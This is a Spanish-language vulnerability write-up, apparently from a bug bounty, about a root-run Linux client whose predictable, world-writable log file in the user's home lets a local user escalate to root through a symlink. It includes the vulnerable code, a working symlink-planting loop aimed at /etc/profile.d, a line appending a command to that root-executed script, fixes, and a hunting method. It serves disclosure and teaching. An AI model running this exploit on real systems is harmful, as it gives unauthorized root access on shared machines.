---
title:       "El proceso root que escribe en tu carpeta: de usuario normal a root con un enlace simbólico"
summary:     "Un servicio que corre como root guardaba su registro en el directorio del usuario que lo lanzaba, con un nombre predecible, y le ponía permisos de escritura para todo el mundo. Eso es todo lo que hace falta para crear cualquier fichero del sistema y que lo ejecute root."
date:        2026-11-11 20:30:00 +0100
lang:        es
ref:         escalada-symlink-log-root

severity:    high
cvss:        "7.8"
cvss_vector: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
cwe:         "CWE-59 · CWE-732"
vuln_class:  "Control de acceso"
target_type: "Cliente de escritorio (Linux)"
platform:    "YesWeHack"
status:      "Reportado"
tags:        [escalada-de-privilegios, linux, symlink, toctou, root, permisos]

takeaways:
  - "Si un proceso root escribe dentro de una carpeta que controla un usuario normal, ese usuario decide qué fichero se escribe."
  - "`touch` y `chmod` **siguen** los enlaces simbólicos. La protección del kernel solo cubre directorios tipo `/tmp`, no tu casa."
  - "«Puedo ejecutar un comando concreto como root» y «soy root» son cosas distintas. Convertir lo primero en lo segundo es escalada de privilegios."
  - "No hace falta ganar una carrera si el nombre del fichero es predecible: plantas el enlace y esperas."
---

De todos los fallos que he publicado, este es el más sencillo de entender y el que más me
hizo pensar. No hay inyección, no hay red, no hay criptografía. Hay **un programa que
escribe un fichero de registro en el sitio equivocado**.

<div class="warn" markdown="1">
**Todo está anonimizado.** Publicado con permiso del programa y sin identificar al
producto: fabricante, nombres de ficheros, rutas y versiones están cambiados. El mecanismo
y el código son exactos.
</div>

## El punto de partida: una regla de `sudo` muy razonable

En un ordenador Linux compartido —un servidor de trabajo, una máquina de laboratorio, un
equipo de empresa— el administrador quiere que un usuario normal pueda arrancar cierta
aplicación, que necesita permisos de root para tocar la red. Así que añade una regla:

```
usuario ALL=(root) NOPASSWD: /usr/bin/cliente
```

<div class="plain" markdown="1">
**En cristiano:** esa línea dice *«este usuario puede ejecutar **este programa concreto**
como administrador, sin pedirle la contraseña»*. Es una práctica **correcta** y
recomendada: en vez de dar permisos de administrador completos, das permiso para una cosa
concreta.

La frontera que el administrador está dibujando es clarísima: *puedes ejecutar ese
programa como root*, no *eres root*. Todo este fallo consiste en borrar esa frontera.
</div>

Y hay que insistir en esto porque es la objeción que me esperaba del triador: *«pero si ya
podía ejecutar algo como root»*. No. Podía ejecutar **un** programa. Ahora puede ejecutar
**cualquiera**, incluida la lectura de `/etc/shadow` y la instalación de persistencia.

## Las tres líneas del fallo

Dentro del cliente, esto:

```python
# configuración
DIR_LOGS = '/home/' + (os.getenv('SUDO_USER') or os.getenv('USER')) + '/.cliente/logs'

# al conectar
fichero_log = DIR_LOGS + '/log-' + str(int(time.time())) + '.log'
ejecutar('touch ' + fichero_log + '; chmod 666 ' + fichero_log)

# y el ejecutor
def ejecutar(comando):
    subprocess.Popen(comando, shell=True)
```

Léelo despacio, porque las tres cosas que lo rompen están a la vista:

**1. El proceso es root, pero escribe en una carpeta del usuario.**

```python
os.getenv('SUDO_USER')
```

<div class="plain" markdown="1">
**En cristiano:** cuando ejecutas algo con `sudo`, el sistema deja una pista de quién
eras: la variable `SUDO_USER`. El programa la usa **a propósito** para dejar los registros
en la carpeta del usuario, no en la de root. La intención es buena —que puedas leer tus
propios logs—, pero el efecto es que **un proceso todopoderoso está escribiendo dentro de
un territorio que tú controlas por completo**.
</div>

**2. El nombre del fichero es predecible.** Es la hora, en segundos. No hay nada aleatorio.

**3. Le pone permiso de escritura para todo el mundo**, con `chmod 666`.

## Qué es un enlace simbólico y por qué esto lo rompe todo

Un enlace simbólico es un fichero que no contiene datos: contiene **una dirección**. Es un
cartel que dice «lo que buscas está allí».

```bash
ln -s /etc/passwd  mi-atajo
cat mi-atajo          # muestra /etc/passwd
```

<div class="plain" markdown="1">
**En cristiano:** es un acceso directo. Lo importante para nosotros es **quién lo sigue**:
la mayoría de los programas, al escribir en un enlace, **escriben en el destino**, no en el
enlace.

Así que si yo pongo un acceso directo donde tú vas a escribir, y tú eres root... **escribes
donde yo te diga**.
</div>

Y sí: `touch` y `chmod` siguen los enlaces.

<div class="note" markdown="1">
**«¿Pero el kernel no protege contra esto?»** Sí, parcialmente, con una protección llamada
`protected_symlinks`. Y por eso es importante leerla bien: solo actúa en directorios
**compartidos y con el bit *sticky***, del estilo de `/tmp`, donde escriben todos los
usuarios.

La carpeta personal del usuario **no es uno de esos directorios**. Es suya, normal y
corriente. La protección no aplica. Lo comprobé con las dos opciones del kernel activadas,
que es la configuración por defecto de una distribución moderna.
</div>

## El ataque, en cuatro pasos

El atacante es una cuenta local **sin privilegios**: sin grupos especiales, sin contraseña
válida, con la única regla de `sudo` de más arriba.

```bash
# 1 · plantar un enlace por segundo en la ruta predecible, apuntando al objetivo
while true; do
    ln -sf /etc/profile.d/x.sh "$HOME/.cliente/logs/log-$(date +%s).log"
    sleep 1
done
```

```bash
# 2 · esperar. No es una carrera: la ventana son minutos.
```

```
# 3 · el usuario legítimo conecta. Root ejecuta:
#     touch <ruta>; chmod 666 <ruta>
#     ...sigue el enlace, y crea /etc/profile.d/x.sh con dueño root y permiso 666
```

```bash
# 4 · escribir en ese fichero, que ahora es de root pero escribible por cualquiera
echo 'id > /tmp/CANARIO' >> /etc/profile.d/x.sh
```

<div class="plain" markdown="1">
**En cristiano:** `/etc/profile.d/` es una carpeta cuyos scripts se ejecutan **cada vez que
alguien abre una sesión**, incluido root. Así que he conseguido que root cree un fichero
que yo puedo escribir, dentro de una carpeta cuyo contenido root ejecuta. Lo que escriba
ahí, se ejecuta con sus permisos.

Y fíjate en el paso 2: **no hay que ganar ninguna carrera**. Como el nombre depende solo de
la hora en segundos, planto un enlace por segundo y espero tranquilamente. Esa es la
diferencia entre un fallo «teóricamente explotable» y uno que funciona siempre.
</div>

Nota aparte: aunque no haya ningún atacante, **cada registro que escribe ese programa
queda con permisos de lectura y escritura para todos los usuarios de la máquina**. Eso ya
es un problema por sí solo en cualquier equipo compartido.

## Dónde paré, y por qué lo cuento

Esta parte iba en el reporte y me parece tan importante como el fallo:

- **No** apunté el enlace a `/etc/shadow`, ni a `/etc/sudoers.d/`, ni a `/etc/ld.so.preload`
  ni a ningún fichero real del sistema.
- El enlace apuntaba a un fichero canario **con mi propio nombre**, que borré en cuanto
  quedó demostrado.
- No ejecuté nada como root más allá de dejar escrito el comentario del canario.
- No toqué datos de nadie: la máquina era una máquina virtual mía, con cuentas mías.
- Paré **en cuanto la primitiva quedó confirmada**, desinstalé el cliente y borré todo.

<div class="plain" markdown="1">
**En cristiano:** para demostrar que puedo crear cualquier fichero como root, **basta con
crear uno inofensivo**. Apuntar a `/etc/shadow` no demuestra nada más y convierte tu
reporte en un incidente. La diferencia entre un investigador y un problema es exactamente
dónde decide parar.
</div>

## El control negativo

| Qué probé | Qué pasó | Qué descarta |
|---|---|---|
| El mismo flujo **sin** plantar el enlace | El registro se crea normalmente en la carpeta del usuario | Que el programa fallara por sí solo |
| Comprobar el otro modo de conexión del mismo producto | **No** usa esa secuencia y escribe en una carpeta propia de root | Que fuera un fallo general del producto: está acotado a una ruta |
| Protecciones del kernel activadas | El ataque **funciona igual** | Que el sistema operativo ya lo cubriera |

<div class="plain" markdown="1">
**En cristiano:** la segunda fila es la que más credibilidad da. Comprobé el camino
hermano del mismo programa y **no era vulnerable**, y lo dije en el reporte aunque me
quitara alcance. Acotar tu propio hallazgo es lo que hace que el triador se fíe del resto
de lo que cuentas.
</div>

## Impacto

<div class="impact" markdown="1">
**Impacto.** Cualquier usuario local sin privilegios, en una máquina donde exista esa regla
de `sudo`, obtiene **ejecución como root**: lectura de `/etc/shadow`, persistencia,
modificación de binarios del sistema y acceso a los ficheros de todos los demás usuarios.
El escenario natural de este cliente son equipos compartidos —estaciones de trabajo, saltos
de administración, máquinas de laboratorio—, que es exactamente donde dar un permiso
acotado en vez de root completo es la práctica **correcta**. El fallo castiga precisamente
a quien hizo bien su trabajo.
</div>

## El arreglo

1. **Escribir los registros en una carpeta de root**, tipo `/var/log/aplicacion/`, y no en
   la casa del usuario. Es el arreglo de una línea y resuelve el fallo entero.
2. Si tienen que quedarse en la carpeta del usuario, **abrir el fichero desde el lenguaje**
   con las banderas que impiden seguir enlaces y exigen crear un fichero nuevo:

   ```python
   os.open(ruta, os.O_NOFOLLOW | os.O_CREAT | os.O_EXCL, 0o644)
   ```

3. **Quitar el `chmod 666`** por completo. No hay ninguna razón para que un registro sea
   escribible por todo el mundo.
4. **Dejar de construir comandos como texto**: pasar una lista de argumentos en vez de una
   frase a la shell.

## Cómo buscar esto tú mismo

Esta clase se caza con dos comandos en cualquier aplicación que se ejecute con privilegios:

```bash
# 1 · ¿qué ficheros toca cuando corre como root?
sudo strace -f -e trace=openat,open,chmod,chown /usr/bin/aplicacion 2>&1 \
  | grep -vE '/usr/|/lib/|/proc/'

# 2 · ¿alguno está en una ruta que yo controlo?
```

Y las preguntas, en este orden:

1. **¿Escribe en algún sitio bajo mi control?** Tu carpeta personal, `/tmp`, un directorio
   del que eres dueño.
2. **¿El nombre es predecible?** Una hora, un contador, un PID. Si lleva algo aleatorio de
   verdad, se complica mucho.
3. **¿Sigue enlaces?** `touch`, `chmod`, `chown`, `cp`, `>` de la shell: todos siguen.
4. **¿Qué fichero del sistema me interesa crear o volver escribible?** `/etc/profile.d/`,
   un servicio del sistema, una tarea programada.

Si las cuatro respuestas te acompañan, tienes una escalada a root.
